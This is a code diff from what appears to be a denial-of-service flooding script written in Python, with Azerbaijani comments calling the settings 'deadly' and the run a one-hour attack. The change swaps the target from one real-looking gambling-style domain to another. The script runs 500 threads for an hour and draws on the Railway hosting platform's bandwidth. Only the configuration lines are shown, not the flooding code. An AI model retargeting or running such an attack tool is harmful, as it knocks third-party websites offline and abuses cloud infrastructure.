@@ -6,7 +6,7 @@ import string
 
 # --- ÖLÜMCÜL AYARLAR ---
 # Saytın portu (HTTPS üçün 443, HTTP üçün 80)
-TARGET_HOST = "https://www.appl88-vip.com"
+TARGET_HOST = "https://streamwin.win"
 TARGET_PORT = 443
 THREADS = 500 # Railway-in internet kanalını sona qədər istifadə edir
 DURATION = 3600 # 1 Saatlıq hücum
